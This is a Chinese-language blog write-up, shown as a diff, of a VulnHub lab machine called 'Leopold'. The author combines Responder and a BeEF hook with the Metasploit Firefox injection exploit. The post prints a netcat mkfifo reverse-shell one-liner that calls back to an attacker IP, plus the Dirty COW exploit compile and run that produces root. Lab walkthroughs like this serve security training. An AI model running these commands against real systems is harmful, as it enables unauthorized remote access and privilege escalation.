@@ -18,8 +18,91 @@ Flags/root/flag.txt/home/leopold/flag.txtTested with VirtualBoxDHCPDifficulty: B
 <blockquote>
 <p>PORT    STATE SERVICE     VERSION<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open  netbios-ssn Samba smbd 3.6.6 (workgroup: WORKGROUP)<br>MAC Address: 08:00:27:62:04:49 (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 2.6.X|3.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3<br>OS details: Linux 2.6.32 - 3.10<br>Network Distance: 1 hop</p>
 <p>Host script results:<br>|_clock-skew: mean: -59m55s, deviation: 1h24m51s, median: -1h59m55s<br>|<em>nbstat: NetBIOS name: LEOPOLD, NetBIOS user: <unknown>, NetBIOS MAC: &lt;unknown(unknown)<br>| smb-os-discovery:<br>|   OS: Unix (Samba 3.6.6)<br>|   Computer name: leopold<br>|   NetBIOS computer name:<br>|   Domain name:<br>|   FQDN: leopold<br>|</unknown></em>  System time: 2019-05-01T15:28:17+02:00<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge<em>response: supported<br>|</em>  message_signing: disabled (dangerous, but default)<br>|_smb2-time: Protocol negotiation failed (SMB2)</p>
-<ul>
-<li></li>
-</ul>
 </blockquote>
+<ul>
+<li><p>注意到samba协议，想起关于samba有很多漏洞，于是试图利用<code>Samba远程命令执行漏洞（CVE-2017-7494）</code>，但是没什么用，太难了！！！</p>
+</li>
+<li><p>根据reddit上的某大牛的提示才有了眉目</p>
+</li>
+<li>利用<strong>responder</strong>，对网卡进行监听并指定目标地址，在<code>responder.conf</code>(/usr/share/responder/Responder.conf)  更改如下：</li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea4fcec341630825.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/05/26/5cea4ff03467a88106.png" alt=""></p>
+<ul>
+<li>在files文件下新建一个<code>redirect.html</code>，内容如下：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; URL=&apos;http://192.168.199.238:3000/demos/basic.html&apos;&quot; /&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>basic.html</code>是<code>beef</code>框架下的一个用于基本漏洞利用</li>
+<li>开启<code>beef</code></li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea514d6bbc775894.png" alt=""></p>
+<ul>
+<li>本地登录<code>127.0.0.1:3000</code>，用户名和密码均为<code>beef</code></li>
+<li>然后开启responder：<code>responder --basic -I eth0</code></li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea51d3b837958367.png" alt=""></p>
+<ul>
+<li>在beef的<code>panel</code>中可以看到：</li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea52100d38c72906.png" alt=""></p>
+<ul>
+<li><p>于是就可利用msf的<code>firefox_tostring_console_injection</code>模块，该漏洞描述如下：</p>
+<blockquote>
+<p>This exploit gains remote code execution on Firefox 15-22 by abusing two separate<br>Javascript-related vulnerabilities to ultimately inject malicious Javascript code<br>into a context running with chrome:// privileges.</p>
+</blockquote>
+</li>
+<li><p>直接<code>run -j</code></p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea539c87da679849.png" alt=""></p>
+<ul>
+<li>更改<code>redirect.html</code>，将<code>url</code>更改为上述生成的会话：</li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea540ae9c9914518.png" alt=""></p>
+<ul>
+<li>然后利用<strong>responder</strong>输入<code>responder --basic -I eth0</code>，等一会儿，msf就会自动生成会话：</li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea54b64d65417320.png" alt=""></p>
+<ul>
+<li>在msf上输入：<code>sessions -i 1</code></li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea550d1773e83513.png" alt=""></p>
+<ul>
+<li>不过这样的shell交互性不强且有点蛋疼，于是我们使用如下命令:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.199.238 2333&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<ul>
+<li>本地监听：<code>nc -lvvp 2333</code></li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea55984764889404.png" alt=""></p>
+<ul>
+<li><p>当前目录下就有一个<code>flag</code>，但我们目标是拿到<code>root</code>权限，于是我们先收集信息：<code>uname -a</code>：</p>
+<blockquote>
+<p>Linux leopold 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux</p>
+</blockquote>
+</li>
+<li><p>看见这内核版本，我们就可以利用<code>dirtycow</code>（脏牛），脏牛：</p>
+<blockquote>
+<p>脏牛（Dirty Cow）是Linux内核的一个提权漏洞，攻击者可以利用这个漏洞获取root权限。之所以叫Dirty Cow，因为这个漏洞利用了Linux的copy-on-write机制。脏牛的CVE编号是CVE-2016-5195。<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。<br>360 Vulpecker Team：Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响</p>
+</blockquote>
+</li>
+<li><p><a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" target="_blank" rel="noopener">poc地址</a></p>
+</li>
+<li><p>将其下载到本地的另一台主机上，然后再进行下载：</p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea5892dfd3177422.png" alt=""></p>
+<ul>
+<li>在<code>/tmp</code>目录下进行编译：<code>gcc -o dirtycow dirty.c -pthread -lcrypt</code></li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea5903a9b3080649.png" alt=""></p>
+<ul>
+<li>然后运行，等待一会，便成功创建了<code>firefart</code>账号</li>
+</ul>
+<p><img src="https://i.loli.net/2019/05/26/5cea596c2ed1661384.png" alt=""></p>
+<ul>
+<li>然后切换账户，便成功得到了<code>root</code>权限，在<code>/root</code>目录下即可获得flag</li>
+</ul>
+<p>reference：<br><a href="https://www.cnblogs.com/bmjoker/p/9538541.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9538541.html</a><br><a href="https://www.sevenlayers.com/index.php/182-vulnhub-sp-leopold-walkthrough" target="_blank" rel="noopener">https://www.sevenlayers.com/index.php/182-vulnhub-sp-leopold-walkthrough</a><br><a href="https://www.jianshu.com/p/1b545a8b8b1e" target="_blank" rel="noopener">https://www.jianshu.com/p/1b545a8b8b1e</a></p>
 </div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-05-01</span><i class="fa fa-tag"></i><a class="tag" href="/tags/靶机/" title="靶机">靶机 </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/05/01/靶机/leopold/,null,leopold 靶机渗透,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/05/03/靶机/xss-quiz/" title="XSS Challenges">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/04/30/CTF/starctf2019/" title="startctf2019">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
